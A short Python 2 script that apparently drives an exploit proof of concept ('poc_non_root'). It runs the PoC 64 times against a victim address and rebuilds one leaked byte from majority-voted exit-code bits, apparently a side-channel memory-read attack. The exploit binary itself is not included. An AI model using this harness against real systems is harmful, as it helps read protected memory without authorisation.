#!/usr/bin/python

import os
import sys

ret_arr = [0,0,0,0,0,0,0,0]
ret_val = 0
victim_addr = sys.argv[1]
cmd = "sudo ./poc_non_root " + victim_addr + " > /dev/null"

for t in range(0, 64):
	r = os.system(cmd)
	r = r / 256
	mask = 0b00
	val = 0
	print "progress : " + str(t) + " / 64"

	for i in range(len(ret_arr)):
		tmp_mask = 1 << i
		val = r & tmp_mask
		if val != 0:
			ret_arr[i] += 1

for i in range(len(ret_arr)):
	if ret_arr[i] >= 6:
		ret_val |= 1 << i
	print i, ":", ret_arr[i]

print "[" + victim_addr + "] " + "0x%X" % (ret_val)

